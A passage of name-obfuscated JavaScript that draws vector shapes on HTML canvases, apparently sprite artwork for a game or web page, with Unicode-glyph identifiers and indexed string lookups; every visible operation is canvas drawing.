			Δ.moveTo(149 * ᐃ, 92 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 149, 89 * ᐃ, 151 * ᐃ, ᐃ * 84, ᐃ * 156, 79 * ᐃ);
			Δ.bezierCurveTo(161 * ᐃ, 73 * ᐃ, ᐃ * 163, 78 * ᐃ, 162 * ᐃ, 86 * ᐃ);
			Δ.bezierCurveTo(161 * ᐃ, ᐃ * 91, ᐃ * 155, ᐃ * 99, 152 * ᐃ, ᐃ * 98);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ], Ⲇᐃ[ᐃⵠⲆΔᐃ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(111 * ᐃ, 61 * ᐃ);
			Δ.bezierCurveTo(114 * ᐃ, ᐃ * 51, 117 * ᐃ, 51 * ᐃ, 124 * ᐃ, ᐃ * 64);
			Δ.bezierCurveTo(128 * ᐃ, 68 * ᐃ, 128 * ᐃ, 76 * ᐃ, ᐃ * 126, ᐃ * 79);
			Δ.bezierCurveTo(123 * ᐃ, 84 * ᐃ, ᐃ * 122, ᐃ * 82, 115 * ᐃ, 74 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 112, ᐃ * 67, 115 * ᐃ, ᐃ * 74, ᐃ * 115, ᐃ * 74);
			Δ.bezierCurveTo(ᐃ * 111, ᐃ * 68, 111 * ᐃ, ᐃ * 66, 111 * ᐃ, 62 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ], Ⲇᐃ[ⵠⵠⵠⵠ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(107 * ᐃ, 81 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, ᐃ * 74, 112 * ᐃ, 73 * ᐃ, 118 * ᐃ, 84 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 122, 88 * ᐃ, 122 * ᐃ, 93 * ᐃ, 121 * ᐃ, ᐃ * 98);
			Δ.bezierCurveTo(114 * ᐃ, 98 * ᐃ, ᐃ * 113, 98 * ᐃ, ᐃ * 109, 90 * ᐃ);
			Δ.bezierCurveTo(107 * ᐃ, ᐃ * 87, ᐃ * 106, 85 * ᐃ, ᐃ * 107, ᐃ * 82);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(133 * ᐃ, 99 * ᐃ);
			Δ.bezierCurveTo(186 * ᐃ, ᐃ * 123, ᐃ * 199, ᐃ * 152, 209 * ᐃ, 169 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 228, ᐃ * 205, ᐃ * 224, ᐃ * 245, ᐃ * 190, 276 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 161, 296 * ᐃ, ᐃ * 99, 292 * ᐃ, 79 * ᐃ, 274 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 49, 253 * ᐃ, ᐃ * 47, 214 * ᐃ, ᐃ * 50, 197 * ᐃ);
			Δ.bezierCurveTo(61 * ᐃ, 143 * ᐃ, ᐃ * 102, ᐃ * 113, ᐃ * 131, ᐃ * 99);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 73, ᐃ * 270);
			Δ.bezierCurveTo(79 * ᐃ, 280 * ᐃ, ᐃ * 77, 280 * ᐃ, 78 * ᐃ, 287 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 78, 290 * ᐃ, ᐃ * 83, 291 * ᐃ, 82 * ᐃ, 299 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 81, ᐃ * 301, ᐃ * 87, 301 * ᐃ, ᐃ * 92, ᐃ * 314);
			Δ.bezierCurveTo(ᐃ * 94, 319 * ᐃ, ᐃ * ⲆᐃᐃΔⵠᐃΔ, 321 * ᐃ, ᐃ * 107, ᐃ * 320);
			Δ.bezierCurveTo(ᐃ * 111, 323 * ᐃ, 114 * ᐃ, 324 * ᐃ, ᐃ * 119, ᐃ * 320);
			Δ.bezierCurveTo(ᐃ * 137, ᐃ * 321, ᐃ * 146, 323 * ᐃ, ᐃ * 139, ᐃ * 320);
			Δ.bezierCurveTo(141 * ᐃ, 324 * ᐃ, ᐃ * 150, ᐃ * 324, ᐃ * 153, ᐃ * 320);
			Δ.bezierCurveTo(168 * ᐃ, ᐃ * 319, ᐃ * 171, ᐃ * 316, 173 * ᐃ, ᐃ * 307);
			Δ.bezierCurveTo(ᐃ * 180, ᐃ * 305, ᐃ * 180, 301 * ᐃ, 178 * ᐃ, ᐃ * 296);
			Δ.bezierCurveTo(ᐃ * 183, 296 * ᐃ, ᐃ * 185, ᐃ * 289, 188 * ᐃ, ᐃ * 279);
			Δ.bezierCurveTo(ᐃ * 171, 286 * ᐃ, ᐃ * 149, 290 * ᐃ, 132 * ᐃ, ᐃ * 289);
			Δ.bezierCurveTo(101 * ᐃ, 290 * ᐃ, ᐃ * 86, 280 * ᐃ, ᐃ * 74, ᐃ * 271);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 76, 252 * ᐃ);
			Δ.bezierCurveTo(85 * ᐃ, ᐃ * 294, 96 * ᐃ, 314 * ᐃ, ᐃ * 103, 314 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 106, 316 * ᐃ, ᐃ * 151, ᐃ * 314, ᐃ * 156, 314 * ᐃ);
			Δ.bezierCurveTo(169 * ᐃ, 317 * ᐃ, 182 * ᐃ, ᐃ * 285, 191 * ᐃ, ΔΔⵠΔΔᐃⲆ * ᐃ);
			Δ.bezierCurveTo(134.5 * ᐃ, ᐃ * 254, ᐃ * 134.5, 254 * ᐃ, ᐃ * 78, 252 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 84, 257 * ᐃ);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 273, ᐃ * 146, 268 * ᐃ, 179 * ᐃ, ᐃ * 261);
			Δ.bezierCurveTo(190 * ᐃ, ᐃ * 258, 187 * ᐃ, 266 * ᐃ, ᐃ * 178, 272 * ᐃ);
			Δ.bezierCurveTo(160 * ᐃ, ᐃ * 284, 123 * ᐃ, 282 * ᐃ, 100 * ᐃ, ᐃ * 277);
			Δ.bezierCurveTo(ᐃ * 73, 260 * ᐃ, 79 * ᐃ, ᐃ * 257, ᐃ * 84, 257 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ]);
			ⵠᐃᐃ(Δ, 102 * ᐃ, ᐃ * 269, ΔⵠⲆⵠᐃᐃΔ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ]);
			ⵠᐃᐃ(Δ, ᐃ * 98, 266 * ᐃ, 5 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[6]);
			ⵠᐃᐃ(Δ, 168 * ᐃ, ᐃ * 269, 11 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⵠ]);
			ⵠᐃᐃ(Δ, 164 * ᐃ, ᐃ * 266, ᐃ * ᐃⲆⵠΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 125, ᐃ * 65);
			Δ.bezierCurveTo(133 * ᐃ, ᐃ * 45, ᐃ * 136, 42 * ᐃ, 141 * ᐃ, ᐃ * 55);
			Δ.bezierCurveTo(ᐃ * 151, 96 * ᐃ, ᐃ * 164, 117 * ᐃ, ᐃ * 175, ᐃ * 134);
			Δ.bezierCurveTo(203 * ᐃ, 181 * ᐃ, 207 * ᐃ, 182 * ᐃ, ᐃ * 208, 215 * ᐃ);
			Δ.bezierCurveTo(206 * ᐃ, ᐃ * 240, 205 * ᐃ, 246 * ᐃ, ᐃ * 184, ᐃ * 258);
			Δ.bezierCurveTo(ᐃ * 161, 267 * ᐃ, ᐃ * 131, ᐃ * 272, ᐃ * 86, 258 * ᐃ);
			Δ.bezierCurveTo(67 * ᐃ, ᐃ * 252, ᐃ * 68, ᐃ * 239, ᐃ * 64, ᐃ * 216);
			Δ.bezierCurveTo(ᐃ * 62, ᐃ * 194, 72 * ᐃ, 169 * ᐃ, 92 * ᐃ, 142 * ᐃ);
			Δ.bezierCurveTo(106 * ᐃ, 121 * ᐃ, 114 * ᐃ, ᐃ * 101, 125 * ᐃ, 65 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 115, ᐃ * 235);
			Δ.bezierCurveTo(ᐃ * 118, ᐃ * 258, 137 * ᐃ, ᐃ * 268, ᐃ * 148, ᐃ * 246);
			Δ.bezierCurveTo(156 * ᐃ, 228 * ᐃ, ᐃ * 152, 169 * ᐃ, ᐃ * 150, 140 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 147, ᐃ * 87, ᐃ * 143, 69 * ᐃ, ᐃ * 142, ᐃ * 60);
			Δ.bezierCurveTo(ᐃ * 136, ᐃ * 44, ᐃ * 132, ᐃ * 43, ᐃ * 127, 62 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 119, 116 * ᐃ, ᐃ * 119, 140 * ᐃ, ᐃ * 116, 166 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 113, 202 * ᐃ, ᐃ * 113, ᐃ * 223, 115 * ᐃ, ᐃ * 233);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(132 * ᐃ, 219 * ᐃ);
			Δ.bezierCurveTo(140 * ᐃ, ᐃ * 229, ᐃ * 142, ᐃ * 231, ᐃ * 145, ᐃ * 237);
			Δ.bezierCurveTo(ᐃ * 145, ᐃ * 245, 139 * ᐃ, 249 * ᐃ, 133 * ᐃ, ᐃ * 249);
			Δ.bezierCurveTo(ᐃ * 123, ᐃ * 248, 123 * ᐃ, 243 * ᐃ, ᐃ * 121, 239 * ᐃ);
			Δ.bezierCurveTo(126 * ᐃ, 227 * ᐃ, ᐃ * 129, 223 * ᐃ, 132 * ᐃ, ᐃ * 219);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(133 * ᐃ, ᐃ * 179);
			Δ.bezierCurveTo(ᐃ * 140, ᐃ * 188.5, ᐃ * 140, 188.5 * ᐃ, 147 * ᐃ, 198 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 148, ᐃ * 209, ᐃ * 142, ᐃ * 214, 133 * ᐃ, 214 * ᐃ);
			Δ.bezierCurveTo(121 * ᐃ, 211 * ᐃ, ᐃ * 121, 207 * ᐃ, ᐃ * 120, 200 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 126.5, ᐃ * 189.5, ᐃ * 126.5, ᐃ * 189.5, ᐃ * 133, ᐃ * 179);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 133, ᐃ * 143);
			Δ.bezierCurveTo(ᐃ * 139, ᐃ * 151.5, ᐃ * 139, 151.5 * ᐃ, ᐃ * 145, ᐃ * 160);
			Δ.bezierCurveTo(ᐃ * 143, 167 * ᐃ, ᐃ * 140, ᐃ * 170, 134 * ᐃ, ᐃ * 170);
			Δ.bezierCurveTo(ᐃ * 128, 169 * ᐃ, ᐃ * 124, 167 * ᐃ, ᐃ * 123, ᐃ * 161);
			Δ.bezierCurveTo(128 * ᐃ, ᐃ * 152, ᐃ * 128, ᐃ * 152, ᐃ * 133, ᐃ * 143);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 133, 115 * ᐃ);
			Δ.bezierCurveTo(137.5 * ᐃ, 121.5 * ᐃ, 137.5 * ᐃ, ᐃ * 121.5, 142 * ᐃ, 128 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 141, 133 * ᐃ, ᐃ * 138, ᐃ * 135, ᐃ * 133, ᐃ * 135);
			Δ.bezierCurveTo(129 * ᐃ, 135 * ᐃ, 125 * ᐃ, 132 * ᐃ, ᐃ * 125, 129 * ᐃ);
			Δ.bezierCurveTo(129 * ᐃ, ᐃ * 122, 129 * ᐃ, 122 * ᐃ, 133 * ᐃ, 115 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(133 * ᐃ, 94 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 136.5, 98.5 * ᐃ, ᐃ * 136.5, ᐃ * 98.5, ᐃ * 140, 103 * ᐃ);
			Δ.bezierCurveTo(139 * ᐃ, ᐃ * 109, ᐃ * 137, ᐃ * 109, ᐃ * 133, ᐃ * 110);
			Δ.bezierCurveTo(ᐃ * 127, ᐃ * 108, 129 * ᐃ, 107 * ᐃ, 127 * ᐃ, ᐃ * 105);
			Δ.bezierCurveTo(ᐃ * 130, 99.5 * ᐃ, 130 * ᐃ, 99.5 * ᐃ, ᐃ * 133, ᐃ * 94);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(130 * ᐃ, 279 * ᐃ);
			Δ.bezierCurveTo(136.5 * ᐃ, ᐃ * 287.5, 136.5 * ᐃ, 287.5 * ᐃ, 143 * ᐃ, 296 * ᐃ);
			Δ.bezierCurveTo(143 * ᐃ, 302 * ᐃ, ᐃ * 139, 309 * ᐃ, 131 * ᐃ, ᐃ * 308);
			Δ.bezierCurveTo(123 * ᐃ, ᐃ * 306, ᐃ * 121, ᐃ * 303, ᐃ * 120, ᐃ * 297);
			Δ.bezierCurveTo(125.5 * ᐃ, 288.5 * ᐃ, 125.5 * ᐃ, ᐃ * 288.5, 131 * ᐃ, ᐃ * 280);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃⵠⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 147, 303 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 151, 311 * ᐃ, ᐃ * 151, ᐃ * 319, 147 * ᐃ, ᐃ * 321);
			Δ.bezierCurveTo(138 * ᐃ, ᐃ * 320, ᐃ * 145, ᐃ * 308, ᐃ * 147, ᐃ * 303);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(115 * ᐃ, 303 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 115, ᐃ * 312, ᐃ * 118, 319 * ᐃ, 115 * ᐃ, 319 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 324, 109 * ᐃ, ᐃ * 318, ᐃ * 109, ᐃ * 314);
			Δ.bezierCurveTo(109 * ᐃ, 308 * ᐃ, ᐃ * 112, 303 * ᐃ, 115 * ᐃ, 303 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 89, 280 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 83, ᐃ * 279, ᐃ * 80, 281 * ᐃ, 81 * ᐃ, ᐃ * 286);
			Δ.bezierCurveTo(ᐃ * 83, ᐃ * 290, 84 * ᐃ, ᐃ * 290, ᐃ * 87, 286 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 94, 290 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93, ᐃ * 294, 90 * ᐃ, ᐃ * 303, 86 * ᐃ, ᐃ * 298);
			Δ.bezierCurveTo(84 * ᐃ, ᐃ * 295, 84 * ᐃ, 291 * ᐃ, 89 * ᐃ, ᐃ * 291);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[8]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 163, ᐃ * 295);
			Δ.bezierCurveTo(175 * ᐃ, 294 * ᐃ, ᐃ * 176, 296 * ᐃ, 175 * ᐃ, 301 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 174, ᐃ * 305, ᐃ * 171, 305 * ᐃ, ᐃ * 166, ᐃ * 300);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 172, 286 * ᐃ);
			Δ.bezierCurveTo(180 * ᐃ, 285 * ᐃ, ᐃ * 181, 285 * ᐃ, ᐃ * 180, ᐃ * 291);
			Δ.bezierCurveTo(176 * ᐃ, ᐃ * 295, ᐃ * 174, 294 * ᐃ, ᐃ * 172, ᐃ * 286);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 115, ᐃ * 37);
			Δ.bezierCurveTo(ᐃ * 116, 28 * ᐃ, 119 * ᐃ, ᐃ * 27, ᐃ * 126, ᐃ * 37);
			Δ.bezierCurveTo(ᐃ * 134, 48 * ᐃ, 134 * ᐃ, ᐃ * 49, ᐃ * 132, 59 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 131, 67 * ᐃ, ᐃ * 127, ᐃ * 65, 120 * ᐃ, 56 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 114, ᐃ * 49, 113 * ᐃ, ᐃ * 43, ᐃ * 115, 38 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 146, ᐃ * 34);
			Δ.bezierCurveTo(ᐃ * 152, 28 * ᐃ, ᐃ * 155, ᐃ * 27, ᐃ * 157, ᐃ * 39);
			Δ.bezierCurveTo(ᐃ * 157, ᐃ * 45, ᐃ * 157, ᐃ * 49, 150 * ᐃ, 56 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 141, ᐃ * 66, ᐃ * 138, 66 * ᐃ, ᐃ * 138, ᐃ * 57);
			Δ.bezierCurveTo(137 * ᐃ, ᐃ * 50, 137 * ᐃ, ᐃ * 47, ᐃ * 141, 42 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 143, ᐃ * 69);
			Δ.bezierCurveTo(148 * ᐃ, ᐃ * 56, ᐃ * 156, 50 * ᐃ, 158 * ᐃ, 58 * ᐃ);
			Δ.bezierCurveTo(159 * ᐃ, 64 * ᐃ, 160 * ᐃ, 67 * ᐃ, 153 * ᐃ, 77 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 148, ᐃ * 83, ᐃ * 145, ᐃ * 84, 143 * ᐃ, ᐃ * 77);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔΔΔᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(149 * ᐃ, ᐃ * 92);
			Δ.bezierCurveTo(149 * ᐃ, ᐃ * 89, 151 * ᐃ, 84 * ᐃ, 156 * ᐃ, 79 * ᐃ);
			Δ.bezierCurveTo(161 * ᐃ, 73 * ᐃ, ᐃ * 163, ᐃ * 78, ᐃ * 162, ᐃ * 86);
			Δ.bezierCurveTo(161 * ᐃ, ᐃ * 91, 155 * ᐃ, ᐃ * 99, ᐃ * 152, 98 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃᐃⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 111, 61 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 114, ᐃ * 51, ᐃ * 117, ᐃ * 51, ᐃ * 124, 64 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 128, ᐃ * 68, ᐃ * 128, ᐃ * 76, ᐃ * 126, 79 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123, 84 * ᐃ, ᐃ * 122, 82 * ᐃ, ᐃ * 115, 74 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, 67 * ᐃ, ᐃ * 115, ᐃ * 74, 115 * ᐃ, 74 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 111, 68 * ᐃ, ᐃ * 111, ᐃ * 66, ᐃ * 111, 62 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆᐃΔⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 107, 81 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 108, ᐃ * 74, 112 * ᐃ, 73 * ᐃ, 118 * ᐃ, 84 * ᐃ);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 88, ᐃ * 122, 93 * ᐃ, ᐃ * 121, ᐃ * 98);
			Δ.bezierCurveTo(114 * ᐃ, 98 * ᐃ, 113 * ᐃ, 98 * ᐃ, 109 * ᐃ, ᐃ * 90);
			Δ.bezierCurveTo(107 * ᐃ, 87 * ᐃ, 106 * ᐃ, 85 * ᐃ, ᐃ * 107, 82 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7]);
			return Ⲇⵠ
		}

		function ᐃⲆⲆⲆⵠΔⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 147 * ᐃ;
			Ⲇⵠ.height = 172 * ᐃ;
			Δ.globalAlpha = .5;
			Δ.translate(Ⲇᐃⵠⵠ, ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 8, 50 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⲆΔΔⵠⲆ, ᐃ * ΔΔᐃᐃⲆ, ᐃ * 49, ⵠᐃΔⵠᐃ * ᐃ, ᐃ * 67, ⵠᐃᐃΔ * ᐃ);
			Δ.bezierCurveTo(121 * ᐃ, ᐃ * ΔⲆΔᐃ, 128 * ᐃ, 32 * ᐃ, ᐃ * 135, ᐃ * 48);
			Δ.bezierCurveTo(146 * ᐃ, ᐃ * 96, 124 * ᐃ, 131 * ᐃ, 96 * ᐃ, ᐃ * 135);
			Δ.bezierCurveTo(96 * ᐃ, ᐃ * 158, ᐃ * 79, ᐃ * 156, 75 * ᐃ, 156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 50, 154 * ᐃ, 53 * ᐃ, 150 * ᐃ, ᐃ * 52, 135 * ᐃ);
			Δ.bezierCurveTo(2 * ᐃ, 127 * ᐃ, ᐃ * 3, ᐃ * 87, 8 * ᐃ, ᐃ * 50);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(ᐃⵠⲆ, -ΔᐃᐃⲆᐃ * ᐃ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ΔᐃΔⲆⲆ * ᐃ, ᐃ * 50);
			Δ.bezierCurveTo(ᐃ * ᐃΔⲆᐃᐃΔᐃ, ᐃ * ᐃᐃᐃᐃⲆᐃᐃ, ᐃ * 49, 6 * ᐃ, ᐃ * 67, ᐃ * 6);
			Δ.bezierCurveTo(121 * ᐃ, ᐃ * ΔⲆᐃⲆ, 128 * ᐃ, ᐃ * 32, 135 * ᐃ, 48 * ᐃ);
			Δ.bezierCurveTo(146 * ᐃ, 96 * ᐃ, 124 * ᐃ, 131 * ᐃ, 96 * ᐃ, ᐃ * 135);
			Δ.bezierCurveTo(96 * ᐃ, ᐃ * 158, 79 * ᐃ, 156 * ᐃ, 75 * ᐃ, ᐃ * 156);
			Δ.bezierCurveTo(50 * ᐃ, ᐃ * 154, ᐃ * 53, ᐃ * 150, ᐃ * 52, ᐃ * 135);
			Δ.bezierCurveTo(2 * ᐃ, 127 * ᐃ, 3 * ᐃ, ᐃ * 87, ᐃ * 8, ᐃ * 50);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⵠⲆⲆⲆ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ⵠⲆⲆⵠΔⵠⲆ * ᐃ, ᐃ * 57);
			Δ.bezierCurveTo(ᐃ * 2, ᐃ * 50, 5 * ᐃ, 22 * ᐃ, 24 * ᐃ, ᐃ * 22);
			Δ.bezierCurveTo(ᐃ * 41, ᐃ * 21, 54 * ᐃ, ᐃ * 32, ᐃ * 55, 48 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 93, 47 * ᐃ);
			Δ.bezierCurveTo(94 * ᐃ, 24 * ᐃ, ᐃ * 116, 21 * ᐃ, 120 * ᐃ, ⵠⲆⲆⲆⲆ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 144, 17 * ᐃ, 146 * ᐃ, ᐃ * 52, ᐃ * 133, 58 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 4);
			ⵠᐃᐃ(Δ, ᐃ * 51, 91 * ᐃ, ᐃ * 9);
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃⵠ]);
			ⵠᐃᐃ(Δ, ᐃ * 95, ᐃ * 91, ΔⵠᐃΔΔΔⵠ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠⵠ]);
			ⵠᐃᐃ(Δ, ᐃ * 91, 89 * ᐃ, ᐃ * ⲆⵠᐃΔ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, 47 * ᐃ, 89 * ᐃ, ⲆᐃᐃΔ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 54, ᐃ * 133);
			Δ.bezierCurveTo(56 * ᐃ, 108 * ᐃ, 64 * ᐃ, ᐃ * 99, ᐃ * 73, 98 * ᐃ);
			Δ.bezierCurveTo(86 * ᐃ, ᐃ * 97, 91 * ᐃ, ᐃ * 119, ᐃ * 93, 133 * ᐃ);
			Δ.bezierCurveTo(94 * ᐃ, ᐃ * 155, ᐃ * 90, ᐃ * 150, ᐃ * 74, ᐃ * 155);
